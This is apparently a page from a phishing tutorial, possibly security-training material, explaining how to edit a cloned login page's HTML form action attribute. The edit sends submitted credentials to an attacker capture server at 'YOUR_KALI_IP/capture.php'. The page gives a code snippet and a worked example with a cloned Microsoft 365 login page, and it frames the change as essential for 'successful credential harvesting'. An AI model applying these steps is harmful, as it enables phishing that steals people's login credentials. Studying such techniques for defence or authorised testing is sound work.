Redirecting Submissions: The `action` Attribute

Ensuring Credentials Land on Your Server

HTML Form Action Modification
<!-- Original form action -->
<form action="/login" method="post">
  <!-- ... input fields ... -->
</form>

<!-- Modified form action -->
<form action="http://YOUR_KALI_IP/capture.php" method="post">
  <!-- ... input fields ... -->
</form>

The `action` Attribute

Specifies where to send the form-data when a form is submitted. By default, it points to the legitimate server's login endpoint. Modifying it redirects the data flow.

Common Mistake

Forgetting to change the `action` attribute, or pointing it to an incorrect URL, will result in credentials being sent to the original server or a non-existent endpoint, rendering the phishing attempt useless.

Concrete Example

If a cloned Microsoft 365 login page has action="/login.srf", you would change it to action="http://192.168.1.100/capture.php" (assuming 192.168.1.100 is your Kali IP) to intercept the credentials.

Key Takeaway

The `action` attribute is the critical link between your fake login page and your capture server. Correctly modifying it is non-negotiable for successful credential harvesting. Always verify this change.
